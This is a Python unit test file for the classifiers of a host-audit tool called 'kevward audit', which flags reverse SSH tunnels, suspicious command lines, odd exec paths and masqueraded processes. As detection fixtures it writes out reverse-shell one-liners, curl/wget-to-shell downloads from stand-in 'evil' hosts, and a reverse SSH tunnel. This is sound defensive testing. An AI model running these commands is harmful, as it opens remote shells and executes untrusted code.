# SPDX-License-Identifier: AGPL-3.0-or-later
# Copyright (c) 2026 Forex Robotics Co., Ltd.

"""Unit tests for `kevward audit` classifiers (pure; no root/network/host)."""

from __future__ import annotations

from kevward import audit as ad


def test_is_external_ip():
    for ip in ("8.8.8.8", "93.184.216.34", "2606:4700:4700::1111"):
        assert ad.is_external_ip(ip), ip
    for ip in ("127.0.0.1", "10.0.0.5", "192.168.1.1", "172.16.9.9",
               "169.254.1.1", "::1", "fe80::1", "not-an-ip"):
        assert not ad.is_external_ip(ip), ip


def test_is_reverse_ssh_detects_R_and_D():
    assert ad.is_reverse_ssh(["ssh", "-fNR", "9000:localhost:22", "evil.example"]) \
        .startswith("reverse")
    assert ad.is_reverse_ssh(["ssh", "-R", "9000:localhost:22", "h"]).startswith("reverse")
    assert "dynamic" in ad.is_reverse_ssh(["ssh", "-D", "1080", "h"]).lower()
    assert ad.is_reverse_ssh(["ssh", "-o", "RemoteForward=9000 localhost:22", "h"])
    # plain outbound ssh / local-forward only is not flagged
    assert ad.is_reverse_ssh(["ssh", "-L", "8080:localhost:80", "h"]) is None
    assert ad.is_reverse_ssh(["ssh", "user@host"]) is None


def test_is_suspicious_cmdline():
    for bad in (
        "bash -i >& /dev/tcp/10.0.0.1/4444 0>&1",
        "nc -e /bin/sh 1.2.3.4 9001",
        "curl http://evil/x.sh | sh",
        "wget -qO- http://evil | bash",
        "socat tcp:evil:443 exec:/bin/bash",
    ):
        assert ad.is_suspicious_cmdline(bad), bad
    for ok in ("curl -o file https://example.com/x", "nginx -g daemon off;",
               "/usr/bin/python3 /opt/app/run.py"):
        assert not ad.is_suspicious_cmdline(ok), ok


def test_is_suspicious_exec_flags_temp_paths_and_patterns():
    assert ad.is_suspicious_exec("ExecStart=/tmp/.x/beacon")
    assert ad.is_suspicious_exec("ExecStart=/bin/bash -i >& /dev/tcp/1.2.3.4/5 0>&1")
    assert ad.is_suspicious_exec("ExecStart=/usr/sbin/nft -f /etc/kevward/firewall.nft") is None
    assert ad.is_suspicious_exec("ExecStart=/usr/local/bin/kevward report") is None


def test_split_hostport_handles_v4_and_v6():
    assert ad._split_hostport("1.2.3.4:443") == ("1.2.3.4", 443)
    assert ad._split_hostport("[2606:4700::1]:443") == ("2606:4700::1", 443)
    assert ad._split_hostport("garbage") == (None, None)


def test_proc_of_parses_ss_users_column():
    line = 'ESTAB 0 0 10.0.0.5:51234 93.184.216.34:443 users:(("curl",pid=1234,fd=3))'
    assert ad._proc_of(line) == "curl"
    assert ad._proc_of("ESTAB 0 0 a b") == ""


def test_is_suspicious_php_prepend():
    assert ad.is_suspicious_php_prepend("/tmp/.x/shell.php")
    assert ad.is_suspicious_php_prepend("/dev/shm/p.php")
    assert ad.is_suspicious_php_prepend("/var/www/.hidden/pre.php")
    # unset / an in-package app prepend at a normal path are not flagged by shape
    assert ad.is_suspicious_php_prepend("") is None
    assert ad.is_suspicious_php_prepend("none") is None
    assert ad.is_suspicious_php_prepend('"/usr/share/php/Sentry/prepend.php"') is None


def test_classify_proc_exe():
    assert ad.classify_proc_exe("/dev/shm/.gs/x")
    assert "deleted" in ad.classify_proc_exe("/tmp/beacon (deleted)")
    assert ad.classify_proc_exe("/home/u/.cache/.a")
    # normal binaries, incl. a daemon pending restart after an upgrade, stay quiet
    assert ad.classify_proc_exe("/usr/sbin/sshd") is None
    assert ad.classify_proc_exe("/usr/sbin/nginx (deleted)") is None


def test_is_masqueraded():
    assert ad.is_masqueraded("/dev/shm/x", "[kcached]")
    assert not ad.is_masqueraded("", "[kworker/0:1]")   # real kernel thread: no exe
    assert not ad.is_masqueraded("/usr/bin/bash", "bash")


def test_classify_dpkg_verify():
    assert ad.classify_dpkg_verify("??5??????   /usr/bin/ssh")[0] == "/usr/bin/ssh"
    assert ad.classify_dpkg_verify("??5?????? c /etc/ssh/sshd_config") is None  # conffile
    assert ad.classify_dpkg_verify("missing     /usr/share/doc/x/README") is None
    assert ad.classify_dpkg_verify("?????????  /usr/bin/ok") is None  # no checksum change
    assert ad.classify_dpkg_verify("") is None
    # known post-install churn (CA bundles, pip wheels) is not a signal
    assert ad.classify_dpkg_verify("??5??????   /etc/ssl/certs/ca-certificates.crt") is None
    assert ad.classify_dpkg_verify("??5??????   /usr/lib/x86_64-linux-gnu/libnssckbi.so") is None


if __name__ == "__main__":
    for name, obj in sorted(globals().items()):
        if name.startswith("test_") and callable(obj):
            obj()
            print(f"ok  {name}")
    print("all audit tests passed")
